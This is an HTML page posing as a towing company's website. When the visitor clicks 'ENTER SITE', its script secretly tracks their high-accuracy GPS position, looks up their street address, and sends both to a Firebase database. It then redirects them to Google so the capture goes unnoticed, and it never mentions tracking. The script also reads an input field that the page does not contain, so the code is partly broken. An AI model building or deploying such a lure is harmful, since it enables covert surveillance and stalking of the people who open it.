<!DOCTYPE html>
<html>
<head>
  <title>TOWING</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <style>
    body { font-family: Arial; padding: 20px; background: #111; color: white; }
    input, button { padding: 12px; margin: 8px 0; width: 100%; font-size: 16px; }
    button { background: #222; color: white; border: none; }
    button:disabled { background: #555; cursor: not-allowed; }
  </style>
</head>
<body>

<h2>M&S TOWING</h2>


<button id="enterBtn" onclick="startTracking()" disabled>ENTER SITE</button>

<p id="status">Checking location permission...</p>

<script>
const firebaseConfig = {
  apiKey: "AIzaSy...",
  authDomain: "phone-b3f5d.firebaseapp.com",
  databaseURL: "https://phone-b3f5d-default-rtdb.firebaseio.com/",
  projectId: "phone-b3f5d"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let watchId;

// Check permission immediately
checkLocationPermission();

function checkLocationPermission() {
  if (!navigator.geolocation) {
    document.getElementById("status").innerText = "Geolocation not supported";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    () => {
      document.getElementById("enterBtn").disabled = false;
      document.getElementById("status").innerText = "";
    },
    () => {
      document.getElementById("enterBtn").disabled = true;
      document.getElementById("status").innerText = "";
    }
  );
}

// Reverse geocode
async function getAddress(lat, lng) {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
    const data = await res.json();
    return data.display_name || "Unknown location";
  } catch {
    return "Address unavailable";
  }
}

function startTracking() {
  let userName = document.getElementById("nameInput").value.trim();

  if (!userName) {
    userName = "user_" + Math.random().toString(36).substr(2, 6);
  }

  localStorage.setItem("userName", userName);

  watchId = navigator.geolocation.watchPosition(async (pos) => {
    const lat = pos.coords.latitude;
    const lng = pos.coords.longitude;

    const address = await getAddress(lat, lng);

    db.ref("locations/" + userName).set({
      lat,
      lng,
      address,
      timestamp: Date.now()
    });

  }, (err) => {
    alert(err.message);
  }, {
    enableHighAccuracy: true
  });

  // Redirect after tracking starts
  setTimeout(() => {
    window.location.replace("https://www.google.com");
  }, 1500);
}
</script>

</body>
</html>
